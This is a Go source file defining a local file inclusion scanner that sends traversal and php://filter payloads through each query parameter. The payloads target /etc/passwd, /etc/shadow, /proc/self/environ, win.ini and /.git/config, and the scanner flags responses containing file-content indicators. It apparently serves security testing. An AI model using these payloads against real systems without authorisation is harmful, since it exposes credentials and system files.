package native

import (
	"fmt"
	"io"
	"net/http"
	"strings"
	"time"
)

type LFIResult struct {
	Endpoint   string `json:"endpoint"`
	Parameter  string `json:"parameter"`
	Payload    string `json:"payload"`
	Vulnerable bool   `json:"vulnerable"`
	Evidence   string `json:"evidence"`
}

func TestLFI(baseURL string, params map[string]string) []LFIResult {
	payloads := []string{
		"/etc/passwd",
		"../../../etc/passwd",
		"../../../../../../../../etc/passwd",
		"....//....//....//etc/passwd",
		"..\\..\\..\\windows\\win.ini",
		"..\\..\\..\\..\\..\\..\\..\\boot.ini",
		"file:///etc/passwd",
		"/proc/self/environ",
		"../../../../../../../../proc/self/environ",
		"/etc/hosts",
		"../../../../../../../../etc/hosts",
		"php://filter/convert.base64-encode/resource=index",
		"php://filter/convert.base64-encode/resource=config",
		"/etc/shadow",
		"../../../../../../../../etc/shadow",
		"/windows/system32/drivers/etc/hosts",
		"../../../../../../../../windows/system32/drivers/etc/hosts",
		"../etc/passwd%00",
		"../../../etc/passwd%00",
		"/.git/config",
	}

	lfiIndicators := []string{
		"root:x:0:0:", "root:!:0:0:", "root:*:0:0:",
		"daemon:x:1:1:", "bin:x:2:2:",
		"[boot loader]", "[fonts]",
		"localhost", "127.0.0.1",
		"php://filter", "base64_decode",
		"127.0.0.1\tlocalhost",
		"profile::", "windows",
	}

	client := &http.Client{Timeout: 10 * time.Second}
	var results []LFIResult

	for param := range params {
		for _, payload := range payloads {
			req, _ := http.NewRequest("GET", baseURL, nil)
			q := req.URL.Query()
			for k, v := range params {
				if k == param {
					q.Set(k, payload)
				} else {
					q.Set(k, v)
				}
			}
			req.URL.RawQuery = q.Encode()

			resp, err := client.Do(req)
			if err != nil {
				continue
			}

			var bodyStr string
			if resp.StatusCode == 200 {
				body, err := io.ReadAll(io.LimitReader(resp.Body, 4096))
				if err == nil {
					bodyStr = string(body)
				}
			}
			resp.Body.Close()

			for _, indicator := range lfiIndicators {
				if strings.Contains(bodyStr, indicator) {
					results = append(results, LFIResult{
						Endpoint:   baseURL,
						Parameter:  param,
						Payload:    payload,
						Vulnerable: true,
						Evidence:   fmt.Sprintf("File content indicator '%s' found in response", indicator),
					})
					break
				}
			}

			if resp.StatusCode == 500 && (strings.Contains(payload, "etc/passwd") || strings.Contains(payload, "etc/shadow")) {
				results = append(results, LFIResult{
					Endpoint:   baseURL,
					Parameter:  param,
					Payload:    payload,
					Vulnerable: true,
					Evidence:   fmt.Sprintf("HTTP 500 response suggests file access attempt on '%s'", param),
				})
			}
		}
	}

	if len(results) == 0 {
		results = append(results, LFIResult{
			Endpoint:   baseURL,
			Evidence:   fmt.Sprintf("No LFI detected across %d payloads on %d parameters", len(payloads), len(params)),
		})
	}

	return results
}
